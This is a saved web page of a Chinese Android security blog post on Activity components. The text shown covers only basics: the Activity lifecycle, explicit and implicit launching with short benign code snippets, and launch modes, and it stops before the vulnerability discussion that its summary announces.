<!DOCTYPE html><!--[if lt IE 7]><html class="no-js lt-ie9 lt-ie8 lt-ie7" lang="zh-CN"> <![endif]--><!--[if IE 7]> <html class="no-js lt-ie9 lt-ie8" lang="zh-CN"> <![endif]--><!--[if IE 8]> <html class="no-js lt-ie9" lang="zh-CN"> <![endif]--><!--[if gt IE 8]><!-->
<!-- saved from url=(0050)http://www.droidsec.cn/android-activtity-security/ -->
<html class="no-js" lang="zh-CN"><!--<![endif]--><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="description" content="Android Security 安卓安全中文站 | 移动安全技术与资讯分享 | 安卓应用漏洞挖掘 | 安卓漏洞攻防">
<meta name="author" content="K | Uazoh.com">
<title>Android Activtity Security  |  DroidSec.cn</title>
<link rel="icon" type="image/png" href="http://www.droidsec.cn/wp-content/uploads/2015/03/1112.png"><link rel="alternate" type="application/rss+xml" title="DroidSec.cn » Android Activtity Security评论Feed" href="http://www.droidsec.cn/android-activtity-security/feed/">
		
		<style type="text/css">
img.wp-smiley,
img.emoji {
	display: inline !important;
	border: none !important;
	box-shadow: none !important;
	height: 1em !important;
	width: 1em !important;
	margin: 0 .07em !important;
	vertical-align: -0.1em !important;
	background: none !important;
	padding: 0 !important;
}
</style>
<link rel="stylesheet" id="crayon-css" href="Android Activtity Security _ DroidSec.cn_files/crayon.min.css" type="text/css" media="all">
<link rel="stylesheet" id="crayon-theme-github-css" href="Android Activtity Security _ DroidSec.cn_files/github.css" type="text/css" media="all">
<link rel="stylesheet" id="crayon-font-monaco-css" href="Android Activtity Security _ DroidSec.cn_files/monaco.css" type="text/css" media="all">
<link rel="stylesheet" id="uazoh-bootstrap-css" href="Android Activtity Security _ DroidSec.cn_files/bootstrap.min.css" type="text/css" media="all">
<link rel="stylesheet" id="uazoh-animate-css" href="Android Activtity Security _ DroidSec.cn_files/animate.css" type="text/css" media="all">
<link rel="stylesheet" id="uazoh-mCustomScrollbar-css" href="Android Activtity Security _ DroidSec.cn_files/jquery.mCustomScrollbar.css" type="text/css" media="all">
<link rel="stylesheet" id="uazoh-font-awesome-css" href="Android Activtity Security _ DroidSec.cn_files/font-awesome.min.css" type="text/css" media="all">
<link rel="stylesheet" id="uazoh-main-css" href="Android Activtity Security _ DroidSec.cn_files/main.css" type="text/css" media="all">
<link rel="stylesheet" id="uazoh-h1-css" href="Android Activtity Security _ DroidSec.cn_files/h1.css" type="text/css" media="all">
<link rel="stylesheet" id="uazoh-responsive-css" href="Android Activtity Security _ DroidSec.cn_files/responsive.css" type="text/css" media="all">
<link rel="stylesheet" id="uazoh-color-scheme-css" href="Android Activtity Security _ DroidSec.cn_files/color.css" type="text/css" media="all">
<link rel="stylesheet" id="uazoh-default-style-css" href="Android Activtity Security _ DroidSec.cn_files/style.css" type="text/css" media="all">
<link rel="stylesheet" id="uazoh-LayerSlider-css" href="Android Activtity Security _ DroidSec.cn_files/layerslider.css" type="text/css" media="all">
<style type="text/css"></style>



<link rel="EditURI" type="application/rsd+xml" title="RSD" href="http://www.droidsec.cn/xmlrpc.php?rsd">
<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="http://www.droidsec.cn/wp-includes/wlwmanifest.xml"> 
<link rel="prev" title="Android Logcat Security" href="http://www.droidsec.cn/android-logcat-security/">
<link rel="next" title="Android Content Provider Security" href="http://www.droidsec.cn/android-content-provider-security/">
<meta name="generator" content="WordPress 4.2.2">
<link rel="canonical" href="Android Activtity Security _ DroidSec.cn_files/Android Activtity Security _ DroidSec.cn.html">
<link rel="shortlink" href="http://www.droidsec.cn/?p=16">
<style type="text/css" media="screen">#wp-admin-bar-user-info .avatar-64 {width:64px}</style>
<style></style></head>
<body class="single single-post postid-16 single-format-standard">
<!--专版参数-->
<div id="to-the-top" title="返回顶端" style="display: none;"><i class="fa fa-chevron-up"></i></div>
<!--移动菜单-->
<i class="fa fa-align-justify" id="uazoh7-mobile-menu-btn"></i>
<div class="uazoh7-mobile-menu" id="uazoh7-mobile-menu"> <h3>菜单</h3>
<nav class="menu-%e8%8f%9c%e5%8d%951-container mCustomScrollbar _mCS_1" style="max-height: 567px; overflow: hidden;"><div class="mCustomScrollBox mCS-light" id="mCSB_1" style="position: relative; height: 100%; overflow: hidden; max-width: 100%; max-height: 567px;"><div class="mCSB_container mCS_no_scrollbar" style="position:relative; top:0;"><ul id="mobile_nav" class="mobile-menu"><li><a href="http://www.droidsec.cn/">首页</a><span class="border"></span></li>
<li><a href="http://www.droidsec.cn/android-security-basic/">Android安全基础</a><span class="border"></span></li>
<li><a href="http://www.droidsec.cn/app%e5%ae%89%e5%85%a8%e6%b5%8b%e8%af%95%e5%85%a5%e9%97%a8/">APP安全测试入门</a><span class="border"></span></li>
<li><a href="http://www.droidsec.cn/%e9%87%91%e5%88%9a%e5%ae%a1%e8%ae%a1%e7%b3%bb%e7%bb%9f/">金刚审计系统</a><span class="border"></span></li>
<li><a href="http://www.droidsec.cn/%e5%85%b3%e4%ba%8e%e6%9c%ac%e7%ab%99/">关于DroidSec</a><span class="border"></span></li>
<li><a href="http://weibo.com/androidsec">关注本站微博</a><span class="border"></span></li>
</ul></div><div class="mCSB_scrollTools" style="position: absolute; display: none;"><div class="mCSB_draggerContainer"><div class="mCSB_dragger" style="position: absolute; top: 0px;" oncontextmenu="return false;"><div class="mCSB_dragger_bar" style="position:relative;"></div></div><div class="mCSB_draggerRail"></div></div></div></div><span class="border"></span></nav></div>
    <header class="uazoh7-header uazoh7-header-1">

      <div class="uazoh7-top-bar">
        <div class="container">
          <div class="row">
            <div class="col-lg-12">
              
              <ul class="social-btns">
								<li><a href="http://www.droidsec.cn/feed" title="rss" class="rss regular" target="_blank"><i class="fa fa-rss"></i></a><a href="http://www.droidsec.cn/feed" title="rss" class="rss hover" target="_blank"><i class="fa fa-rss"></i></a></li><li><a href="http://weibo.com/androidsec" title="weibo" class="weibo regular" target="_blank"><i class="fa fa-weibo"></i></a><a href="http://weibo.com/androidsec" title="weibo" class="weibo hover" target="_blank"><i class="fa fa-weibo"></i></a></li><li><a href="http://droidsec/#QQ.com" title="envelope" class="envelope regular" target="_blank"><i class="fa fa-envelope"></i></a><a href="http://droidsec/#QQ.com" title="envelope" class="envelope hover" target="_blank"><i class="fa fa-envelope"></i></a></li>              </ul>
            </div>
          </div>
        </div>
      </div>	   <div class="uazoh7-header-bg" id="uazoh7-header-menu">
        <div class="container">
          <div class="row">
            <div class="col-lg-12">
              <div class="uazoh7-relative">
                <a href="http://www.droidsec.cn/" title="DroidSec.cn">
                <div class="uazoh7-logo">                  <img src="Android Activtity Security _ DroidSec.cn_files/a1a.png" alt="DroidSec.cn">                  <p class="logo">DroidSec.cn</p>
                  <p class="tagline">安卓安全中文站</p>
                </div>
                </a>
				<nav class="menu-%e8%8f%9c%e5%8d%951-container"><ul id="main_nav" class="main-menu"><li><a href="http://www.droidsec.cn/">首页</a><span class="hover"></span></li>
<li><a href="http://www.droidsec.cn/android-security-basic/">Android安全基础</a><span class="hover" style="display: none;"></span></li>
<li><a href="http://www.droidsec.cn/app%e5%ae%89%e5%85%a8%e6%b5%8b%e8%af%95%e5%85%a5%e9%97%a8/">APP安全测试入门</a><span class="hover" style="display: none;"></span></li>
<li><a href="http://www.droidsec.cn/%e9%87%91%e5%88%9a%e5%ae%a1%e8%ae%a1%e7%b3%bb%e7%bb%9f/">金刚审计系统</a><span class="hover" style="display: none;"></span></li>
<li><a href="http://www.droidsec.cn/%e5%85%b3%e4%ba%8e%e6%9c%ac%e7%ab%99/">关于DroidSec</a><span class="hover" style="display: none;"></span></li>
<li><a href="http://weibo.com/androidsec">关注本站微博</a><span class="hover" style="display: none;"></span></li>
</ul></nav>              </div>
            </div>
          </div>
        </div>
      </div>    </header><div class="uazoh7-content" style="padding-top: 0px;"><section class="uazoh7-page-title-1" data-stellar-background-ratio="0.5">
        <div class="container">
          <div class="row">
            <div class="col-lg-9 col-md-9 col-sm-9">
			
								<h1>文章</h1>
				            </div>
            <div class="col-lg-3 col-md-3 col-sm-3">
              <form class="search" method="get" action="http://www.droidsec.cn/"><input type="text" placeholder="输入关键词后回车..." id="s" name="s" value=""><button type="submit" value="Search"><i class="fa fa-search"></i></button></form>            </div>
          </div>
        </div>
      </section>
      <section class="uazoh7-desktop-breadscrubs">
        <div class="container">
          <div class="row">
            <div class="col-lg-12">
              <div class="uazoh7-desktop-breadscrubs-inner">
                 <a href="http://www.droidsec.cn/">Home</a> <i class="fa fa-angle-double-right"></i> <a href="http://www.droidsec.cn/category/%e5%ae%89%e5%8d%93%e6%bc%8f%e6%b4%9e%e6%94%bb%e9%98%b2/">安卓漏洞攻防</a> <i class="fa fa-angle-double-right"></i> Android Activtity Security              </div>
            </div>
          </div>
        </div>
      </section>
      <section class="uazoh7-mobile-breadscrubs">
        <div class="container">
          <div class="row">
            <div class="col-lg-12">
               <a href="http://www.droidsec.cn/">Home</a> <i class="fa fa-angle-double-right"></i> <a href="http://www.droidsec.cn/category/%e5%ae%89%e5%8d%93%e6%bc%8f%e6%b4%9e%e6%94%bb%e9%98%b2/">安卓漏洞攻防</a> <i class="fa fa-angle-double-right"></i> Android Activtity Security            </div>
          </div>
        </div>
      </section><section class="uazoh7-section">
<div class="container">
<div class="row" style="margin-top: 0px;">
<div class="col-lg-9" id="main"><article id="post-16" class="uazoh7-post post-16 post type-post status-publish format-standard hentry category-4 tag-activity tag-uxss">
<header>
<h3 style="margin-top: 0px;"><i class="fa fa-pencil"></i><span> Android Activtity Security</span></h3>
<p> <a href="http://www.droidsec.cn/category/%e5%ae%89%e5%8d%93%e6%bc%8f%e6%b4%9e%e6%94%bb%e9%98%b2/" rel="category tag">安卓漏洞攻防</a> by <a href="http://www.droidsec.cn/author/droidsec/" title="由droidsec发布" rel="author">droidsec</a></p>
</header>

<p>点评：Activity组件作为Android App四大组件中最常见的组件，它的安全性也是最为重要的，本文作者对Activity组件生命周期，两种启动方式（显式、隐式）和加载模式做了简单介绍，并对Activity组件暴露可能造成的权限提升绕过，敏感信息泄露，界面劫持，Crash,远程代码执行等安全漏洞进行详细的讲解，附加的案例都十分经典。</p>
<h2>0x00 科普</h2>
<hr>
<p>Android每一个Application都是由Activity、Service、content Provider和Broadcast Receiver等Android的基本组件所组成，其中Activity是实现应用程序的主体，它承担了大量的显示和交互工作，甚至可以理解为一个”界面”就是一个Activity。<span id="more-16"></span></p>
<p>Activity是为用户操作而展示的可视化用户界面。比如说，一个activity可以展示一个菜单项列表供用户选择，或者显示一些包含说明的照片。一个短消息应用程序可以包括一个用于显示做为发送对象的联系人的列表的activity，一个给选定的联系人写短信的activity以及翻阅以前的短信和改变设置的activity。尽管它们一起组成了一个内聚的用户界面，但其中每个activity都与其它的保持独立。每个都是以Activity类为基类的子类实现。</p>
<p>一个应用程序可以只有一个activity，或如刚才提到的短信应用程序那样，包含很多个。每个activity的作用，以及其数目，自然取决于应用程序及其设计。一般情况下，总有一个应用程序被标记为用户在应用程序启动的时候第一个看到的。从一个activity转向另一个的方式是靠当前的activity启动下一个。</p>
<p>&nbsp;</p>
<h2>0x01 知识要点</h2>
<hr>
<p>参考：<a href="http://developer.android.com/guide/components/activities.html">http://developer.android.com/guide/components/activities.html</a></p>
<p><strong>生命周期</strong></p>
<p><img src="Android Activtity Security _ DroidSec.cn_files/201411171046activity_lifecycle.png" alt=""></p>
<p><strong>启动方式</strong></p>
<p>显示启动</p>
<p>配置文件中注册组件</p><!-- Crayon Syntax Highlighter v2.7.1 -->

		<div id="crayon-55a7a4b071658463237884" class="crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style="margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important; height: auto;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important; height: 18px !important; line-height: 18px !important; margin-top: -18px; display: none; z-index: 4;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button crayon-pressed" title="切换是否显示行编号"><div class="crayon-button-icon" style="background-image: url(http://www.droidsec.cn/wp-content/plugins/crayon-syntax-highlighter/css/images/toolbar/buttons@2x.png); background-size: 48px 128px;"></div></div><div class="crayon-button crayon-plain-button" title="纯文本显示代码"><div class="crayon-button-icon" style="background-image: url(http://www.droidsec.cn/wp-content/plugins/crayon-syntax-highlighter/css/images/toolbar/buttons@2x.png); background-size: 48px 128px;"></div></div><div class="crayon-button crayon-wrap-button" title="切换自动换行"><div class="crayon-button-icon" style="background-image: url(http://www.droidsec.cn/wp-content/plugins/crayon-syntax-highlighter/css/images/toolbar/buttons@2x.png); background-size: 48px 128px;"></div></div><div class="crayon-button crayon-expand-button" title="点击展开代码"><div class="crayon-button-icon" style="background-image: url(http://www.droidsec.cn/wp-content/plugins/crayon-syntax-highlighter/css/images/toolbar/buttons@2x.png); background-size: 48px 128px;"></div></div><div class="crayon-button crayon-copy-button" title="复制代码"><div class="crayon-button-icon" style="background-image: url(http://www.droidsec.cn/wp-content/plugins/crayon-syntax-highlighter/css/images/toolbar/buttons@2x.png); background-size: 48px 128px;"></div></div><div class="crayon-button crayon-popup-button" title="在新窗口中显示代码"><div class="crayon-button-icon" style="background-image: url(http://www.droidsec.cn/wp-content/plugins/crayon-syntax-highlighter/css/images/toolbar/buttons@2x.png); background-size: 48px 128px;"></div></div><span class="crayon-language">Java</span></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly="" style="tab-size: 4; font-size: 12px !important; line-height: 15px !important; z-index: 0; opacity: 0; overflow: hidden;">&lt;activity android:name=".ExampleActivity" android:icon="@drawable/app_icon"&gt; &nbsp;&nbsp;&nbsp;&nbsp;&lt;intent-filter&gt; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;action android:name="android.intent.action.MAIN" /&gt; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;category android:name="android.intent.category.LAUNCHER" /&gt; &nbsp;&nbsp;&nbsp;&nbsp;&lt;/intent-filter&gt; &lt;/activity&gt; </textarea></div>
			<div class="crayon-main" style="position: relative; z-index: 1; overflow: hidden;">
				<table class="crayon-table">
					<tbody><tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-55a7a4b071658463237884-1">1</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-55a7a4b071658463237884-1"><span class="crayon-o">&lt;</span><span class="crayon-e">activity </span><span class="crayon-v">android</span><span class="crayon-o">:</span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">".ExampleActivity"</span><span class="crayon-h"> </span><span class="crayon-v">android</span><span class="crayon-o">:</span><span class="crayon-v">icon</span><span class="crayon-o">=</span><span class="crayon-s">"@drawable/app_icon"</span><span class="crayon-o">&gt;</span><span class="crayon-h"> </span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="crayon-o">&lt;</span><span class="crayon-v">intent</span><span class="crayon-o">-</span><span class="crayon-v">filter</span><span class="crayon-o">&gt;</span><span class="crayon-h"> </span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="crayon-o">&lt;</span><span class="crayon-e">action </span><span class="crayon-v">android</span><span class="crayon-o">:</span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"android.intent.action.MAIN"</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span><span class="crayon-h"> </span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="crayon-o">&lt;</span><span class="crayon-e">category </span><span class="crayon-v">android</span><span class="crayon-o">:</span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"android.intent.category.LAUNCHER"</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-o">&gt;</span><span class="crayon-h"> </span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="crayon-o">&lt;</span><span class="crayon-o">/</span><span class="crayon-v">intent</span><span class="crayon-o">-</span><span class="crayon-v">filter</span><span class="crayon-o">&gt;</span><span class="crayon-h"> </span><span class="crayon-o">&lt;</span><span class="crayon-o">/</span><span class="crayon-v">activity</span><span class="crayon-o">&gt;</span><span class="crayon-h"> </span></div></div></td>
					</tr>
				</tbody></table>
			</div>
		</div>
<!-- [Format Time: 0.0069 seconds] -->
<p>直接使用intent对象指定application以及activity启动</p><!-- Crayon Syntax Highlighter v2.7.1 -->

		<div id="crayon-55a7a4b071696759231639" class="crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style="margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important; height: auto;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important; height: 18px !important; line-height: 18px !important; margin-top: -18px; display: none; z-index: 4;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button crayon-pressed" title="切换是否显示行编号"><div class="crayon-button-icon" style="background-image: url(http://www.droidsec.cn/wp-content/plugins/crayon-syntax-highlighter/css/images/toolbar/buttons@2x.png); background-size: 48px 128px;"></div></div><div class="crayon-button crayon-plain-button" title="纯文本显示代码"><div class="crayon-button-icon" style="background-image: url(http://www.droidsec.cn/wp-content/plugins/crayon-syntax-highlighter/css/images/toolbar/buttons@2x.png); background-size: 48px 128px;"></div></div><div class="crayon-button crayon-wrap-button" title="切换自动换行"><div class="crayon-button-icon" style="background-image: url(http://www.droidsec.cn/wp-content/plugins/crayon-syntax-highlighter/css/images/toolbar/buttons@2x.png); background-size: 48px 128px;"></div></div><div class="crayon-button crayon-expand-button" title="点击展开代码" style="display: none;"><div class="crayon-button-icon" style="background-image: url(http://www.droidsec.cn/wp-content/plugins/crayon-syntax-highlighter/css/images/toolbar/buttons@2x.png); background-size: 48px 128px;"></div></div><div class="crayon-button crayon-copy-button" title="复制代码"><div class="crayon-button-icon" style="background-image: url(http://www.droidsec.cn/wp-content/plugins/crayon-syntax-highlighter/css/images/toolbar/buttons@2x.png); background-size: 48px 128px;"></div></div><div class="crayon-button crayon-popup-button" title="在新窗口中显示代码"><div class="crayon-button-icon" style="background-image: url(http://www.droidsec.cn/wp-content/plugins/crayon-syntax-highlighter/css/images/toolbar/buttons@2x.png); background-size: 48px 128px;"></div></div><span class="crayon-language">Java</span></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly="" style="tab-size: 4; font-size: 12px !important; line-height: 15px !important; z-index: 0; opacity: 0; overflow: hidden;">Intent intent = new Intent(this, ExampleActivity.class); startActivity(intent); </textarea></div>
			<div class="crayon-main" style="position: relative; z-index: 1; overflow: hidden;">
				<table class="crayon-table">
					<tbody><tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-55a7a4b071696759231639-1">1</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-55a7a4b071696759231639-1"><span class="crayon-e">Intent </span><span class="crayon-v">intent</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-r">new</span><span class="crayon-h"> </span><span class="crayon-e">Intent</span><span class="crayon-sy">(</span><span class="crayon-r">this</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">ExampleActivity</span><span class="crayon-sy">.</span><span class="crayon-t">class</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-e">startActivity</span><span class="crayon-sy">(</span><span class="crayon-v">intent</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-h"> </span></div></div></td>
					</tr>
				</tbody></table>
			</div>
		</div>
<!-- [Format Time: 0.0024 seconds] -->
<p></p>
<blockquote><div class="blockquote-inner"><i class="fa fa-quote-left"></i>未配置intent-filter的action属性，activity只能使用显示启动。
私有Activity推荐使用显示启动。<i class="fa fa-quote-right"></i></div></blockquote>
<p>隐式启动</p><!-- Crayon Syntax Highlighter v2.7.1 -->

		<div id="crayon-55a7a4b07169d290420680" class="crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style="margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important; height: auto;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important; height: 18px !important; line-height: 18px !important; margin-top: -18px; display: none; z-index: 4;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button crayon-pressed" title="切换是否显示行编号"><div class="crayon-button-icon" style="background-image: url(http://www.droidsec.cn/wp-content/plugins/crayon-syntax-highlighter/css/images/toolbar/buttons@2x.png); background-size: 48px 128px;"></div></div><div class="crayon-button crayon-plain-button" title="纯文本显示代码"><div class="crayon-button-icon" style="background-image: url(http://www.droidsec.cn/wp-content/plugins/crayon-syntax-highlighter/css/images/toolbar/buttons@2x.png); background-size: 48px 128px;"></div></div><div class="crayon-button crayon-wrap-button" title="切换自动换行"><div class="crayon-button-icon" style="background-image: url(http://www.droidsec.cn/wp-content/plugins/crayon-syntax-highlighter/css/images/toolbar/buttons@2x.png); background-size: 48px 128px;"></div></div><div class="crayon-button crayon-expand-button" title="点击展开代码"><div class="crayon-button-icon" style="background-image: url(http://www.droidsec.cn/wp-content/plugins/crayon-syntax-highlighter/css/images/toolbar/buttons@2x.png); background-size: 48px 128px;"></div></div><div class="crayon-button crayon-copy-button" title="复制代码"><div class="crayon-button-icon" style="background-image: url(http://www.droidsec.cn/wp-content/plugins/crayon-syntax-highlighter/css/images/toolbar/buttons@2x.png); background-size: 48px 128px;"></div></div><div class="crayon-button crayon-popup-button" title="在新窗口中显示代码"><div class="crayon-button-icon" style="background-image: url(http://www.droidsec.cn/wp-content/plugins/crayon-syntax-highlighter/css/images/toolbar/buttons@2x.png); background-size: 48px 128px;"></div></div><span class="crayon-language">Java</span></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly="" style="tab-size: 4; font-size: 12px !important; line-height: 15px !important; z-index: 0; opacity: 0; overflow: hidden;">Intent intent = new Intent(Intent.ACTION_SEND); intent.putExtra(Intent.EXTRA_EMAIL, recipientArray); startActivity(intent); </textarea></div>
			<div class="crayon-main" style="position: relative; z-index: 1; overflow: hidden;">
				<table class="crayon-table">
					<tbody><tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-55a7a4b07169d290420680-1">1</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-55a7a4b07169d290420680-1"><span class="crayon-e">Intent </span><span class="crayon-v">intent</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-r">new</span><span class="crayon-h"> </span><span class="crayon-e">Intent</span><span class="crayon-sy">(</span><span class="crayon-v">Intent</span><span class="crayon-sy">.</span><span class="crayon-v">ACTION_SEND</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-v">intent</span><span class="crayon-sy">.</span><span class="crayon-e">putExtra</span><span class="crayon-sy">(</span><span class="crayon-v">Intent</span><span class="crayon-sy">.</span><span class="crayon-v">EXTRA_EMAIL</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">recipientArray</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-e">startActivity</span><span class="crayon-sy">(</span><span class="crayon-v">intent</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-h"> </span></div></div></td>
					</tr>
				</tbody></table>
			</div>
		</div>
<!-- [Format Time: 0.0025 seconds] -->
<p><strong>加载模式launch mode</strong></p>
<p>Activity有四种加载模式：</p>
<ul>
<li><strong>standard</strong>：默认行为。每次启动一个activity，系统都会在目标task新建一个实例。</li>
<li><strong>singleTop</strong>:如果目标activity的实例已经存在于目标task的栈顶，系统会直接使用该实例，并调用该activity的onNewIntent()（不会重新create）</li>
<li><strong>singleTask</strong>:在一个新任务的栈顶创建activity的实例。如果实例已经存在，系统会直接使用该实例，并调用该activity的onNewIntent()（不会重新create）</li>
<li><strong>singleInstance</strong>:和”singleTask”类似，但在目标activity的task中不会再运行其他的activity，在那个task中永远只有一个activity。</li>
</ul>
<p>设置的位置在AndroidManifest.xml文件中activity元素的android:launchMode 属性：</p><!-- Crayon Syntax Highlighter v2.7.1 -->

		<div id="crayon-55a7a4b0716a5624008827" class="crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style="margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important; height: auto;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important; height: 18px !important; line-height: 18px !important; margin-top: -18px; display: none; z-index: 4;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button crayon-pressed" title="切换是否显示行编号"><div class="crayon-button-icon" style="background-image: url(http://www.droidsec.cn/wp-content/plugins/crayon-syntax-highlighter/css/images/toolbar/buttons@2x.png); background-size: 48px 128px;"></div></div><div class="crayon-button crayon-plain-button" title="纯文本显示代码"><div class="crayon-button-icon" style="background-image: url(http://www.droidsec.cn/wp-content/plugins/crayon-syntax-highlighter/css/images/toolbar/buttons@2x.png); background-size: 48px 128px;"></div></div><div class="crayon-button crayon-wrap-button" title="切换自动换行"><div class="crayon-button-icon" style="background-image: url(http://www.droidsec.cn/wp-content/plugins/crayon-syntax-highlighter/css/images/toolbar/buttons@2x.png); background-size: 48px 128px;"></div></div><div class="crayon-button crayon-expand-button" title="点击展开代码" style="display: none;"><div class="crayon-button-icon" style="background-image: url(http://www.droidsec.cn/wp-content/plugins/crayon-syntax-highlighter/css/images/toolbar/buttons@2x.png); background-size: 48px 128px;"></div></div><div class="crayon-button crayon-copy-button" title="复制代码"><div class="crayon-button-icon" style="background-image: url(http://www.droidsec.cn/wp-content/plugins/crayon-syntax-highlighter/css/images/toolbar/buttons@2x.png); background-size: 48px 128px;"></div></div><div class="crayon-button crayon-popup-button" title="在新窗口中显示代码"><div class="crayon-button-icon" style="background-image: url(http://www.droidsec.cn/wp-content/plugins/crayon-syntax-highlighter/css/images/toolbar/buttons@2x.png); background-size: 48px 128px;"></div></div><span class="crayon-language">Java</span></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly="" style="tab-size: 4; font-size: 12px !important; line-height: 15px !important; z-index: 0; opacity: 0; overflow: hidden;">&lt;activity android:name="ActB" android:launchMode="singleTask"&gt;&lt;/activity&gt; </textarea></div>
			<div class="crayon-main" style="position: relative; z-index: 1; overflow: hidden;">
				<table class="crayon-table">
					<tbody><tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-55a7a4b0716a5624008827-1">1</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-55a7a4b0716a5624008827-1"><span class="crayon-o">&lt;</span><span class="crayon-e">activity </span><span class="crayon-v">android</span><span class="crayon-o">:</span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"ActB"</span><span class="crayon-h"> </span><span class="crayon-v">android</span><span class="crayon-o">:</span><span class="crayon-v">launchMode</span><span class="crayon-o">=</span><span class="crayon-s">"singleTask"</span><span class="crayon-o">&gt;</span><span class="crayon-o">&lt;</span><span class="crayon-o">/</span><span class="crayon-v">activity</span><span class="crayon-o">&gt;</span><span class="crayon-h"> </span></div></div></td>
					</tr>
				</tbody></table>
			</div>
		</div>
<!-- [Format Time: 0.0017 seconds] -->
